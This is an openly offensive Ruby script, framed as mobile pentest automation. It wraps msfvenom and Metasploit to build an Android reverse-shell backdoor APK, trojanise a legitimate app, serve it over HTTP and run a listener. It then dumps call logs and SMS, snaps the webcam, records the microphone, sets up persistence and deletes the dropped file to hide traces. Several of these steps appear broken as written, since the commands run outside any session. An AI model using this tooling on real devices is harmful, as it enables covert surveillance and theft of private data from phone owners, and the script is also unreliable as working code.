#!/usr/bin/env ruby

# Mobile Penetration Testing Automation Script
# Author: Muhammad Sudais Usmani
# Description: This script automates various tasks related to mobile pentesting.

def run_command(command)
  puts "[+] Executing: #{command}"
  system(command)
end

def check_adb
  run_command("adb devices")
  run_command("adb connect 192.168.170.101:5555")
end

def adb_shell_access
  run_command("adb shell")
end

def generate_payload
  run_command("msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o backdoor.apk")
end

def inject_payload
  print "Enter path to original APK: "
  original_apk = gets.chomp
  command = "msfvenom -x #{original_apk} -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o infected_app.apk"
  run_command(command)
end

def start_http_server
  run_command("python3 -m http.server 8080 &")
end

def start_msf_listener
  run_command("msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.130.129; set LPORT 443; exploit'")
end

def control_device
  run_command("msfconsole -q -x 'sessions'")
  print "Enter session ID to interact with: "
  session_id = gets.chomp
  command = "msfconsole -q -x 'sessions -i #{session_id}'"
  run_command(command)
end

def extract_data
  run_command("msfconsole -q -x 'dump_calllog'")
  run_command("msfconsole -q -x 'dump_sms'")
  run_command("msfconsole -q -x 'webcam_snap'")
  run_command("msfconsole -q -x 'record_mic 10'")
end

def maintain_access
  run_command("msfconsole -q -x 'run persistence -A'")
end

def clear_traces
  run_command("adb shell rm /sdcard/backdoor.apk")
end

def main
  loop do
    puts "\n[ Mobile Pentesting Automation ]"
    puts "1) Check ADB Connection"
    puts "2) Gain ADB Shell Access"
    puts "3) Generate Malicious APK"
    puts "4) Inject Payload into APK"
    puts "5) Start HTTP Server for Deployment"
    puts "6) Start Metasploit Listener"
    puts "7) Control Compromised Device"
    puts "8) Extract Data from Target"
    puts "9) Maintain Access"
    puts "10) Clear Traces"
    puts "11) Exit"
    print "Choose an option: "
    
    choice = gets.chomp.to_i
    
    case choice
    when 1
      check_adb
    when 2
      adb_shell_access
    when 3
      generate_payload
    when 4
      inject_payload
    when 5
      start_http_server
    when 6
      start_msf_listener
    when 7
      control_device
    when 8
      extract_data
    when 9
      maintain_access
    when 10
      clear_traces
    when 11
      puts "Exiting..."
      break
    else
      puts "Invalid option, please try again."
    end
  end
end

main
